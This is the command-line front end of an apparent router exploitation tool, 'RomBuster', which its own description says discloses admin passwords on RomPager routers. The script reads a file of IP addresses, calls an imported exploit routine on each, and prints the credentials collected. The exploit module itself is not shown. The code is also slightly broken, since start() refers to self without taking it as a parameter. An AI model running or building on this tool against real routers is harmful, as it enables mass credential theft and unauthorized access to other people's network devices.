#!/usr/bin/env python3

import argparse

from core.exploit import Exploit

class CLI(Exploit):
    description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('--ip-list', dest='list', help='IP addresses list.')
    args = parser.parse_args()

    def start():
        with open(self.args.list, 'r') as f:
            lines = f.read().strip().split('\n')
            for line in lines:
                self.exploit(line)
        for credential in self.credentials:
            print(credential)
